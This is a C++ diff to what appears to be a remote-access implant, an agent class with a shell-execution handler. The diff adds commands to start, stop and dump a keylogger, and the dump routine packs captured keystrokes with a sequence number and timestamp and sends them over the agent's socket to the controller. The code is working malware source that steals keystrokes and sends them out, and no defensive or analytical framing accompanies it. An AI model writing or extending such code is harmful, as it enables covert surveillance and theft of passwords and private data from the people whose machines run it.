@@ -8,6 +8,7 @@
 #include <sstream>
 #include <arpa/inet.h>
 #include <algorithm>
+#include <ctime>
 
 namespace inferno {
 
@@ -136,7 +137,60 @@ void Agent::handleDispatching(Packet&& packet) {
         Packet pong(static_cast<uint16_t>(Opcode::PONG), "");
         std::vector<uint8_t> data = pong.serialize();
         m_socket.sendData(data);
+    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
+        handleKeylogStart();
+    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_STOP)) {
+        handleKeylogStop();
+    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DUMP)) {
+        handleKeylogDump();
     }
+}
+
+void Agent::handleKeylogStart() {
+    std::cout << "[Agent] Starting KeyLogger...\n";
+    m_keylogger.start();
+}
+
+void Agent::handleKeylogStop() {
+    std::cout << "[Agent] Stopping KeyLogger...\n";
+    m_keylogger.stop();
+}
+
+void Agent::handleKeylogDump() {
+    std::cout << "[Agent] Dumping KeyLogger buffer...\n";
+    std::string keystrokes = m_keylogger.dump();
+    
+    static uint32_t seq_num = 0;
+    seq_num++;
+    
+    uint32_t timestamp = static_cast<uint32_t>(std::time(nullptr));
+    uint32_t data_len  = static_cast<uint32_t>(keystrokes.size());
+    
+    std::vector<uint8_t> payload;
+    payload.reserve(12 + data_len);
+    
+    // Sequence Number (4 bytes)
+    payload.push_back((seq_num >> 24) & 0xFF);
+    payload.push_back((seq_num >> 16) & 0xFF);
+    payload.push_back((seq_num >> 8) & 0xFF);
+    payload.push_back(seq_num & 0xFF);
+    
+    // Timestamp (4 bytes)
+    payload.push_back((timestamp >> 24) & 0xFF);
+    payload.push_back((timestamp >> 16) & 0xFF);
+    payload.push_back((timestamp >> 8) & 0xFF);
+    payload.push_back(timestamp & 0xFF);
+    
+    // Data Length (4 bytes) - Expanded from 2 bytes to handle 1MB buffer
+    payload.push_back((data_len >> 24) & 0xFF);
+    payload.push_back((data_len >> 16) & 0xFF);
+    payload.push_back((data_len >> 8) & 0xFF);
+    payload.push_back(data_len & 0xFF);
+    
+    payload.insert(payload.end(), keystrokes.begin(), keystrokes.end());
+    
+    Packet res(static_cast<uint16_t>(Opcode::KEYLOG_DATA), std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
 }
 
 void Agent::handleShellExecution(Packet&& packet) {
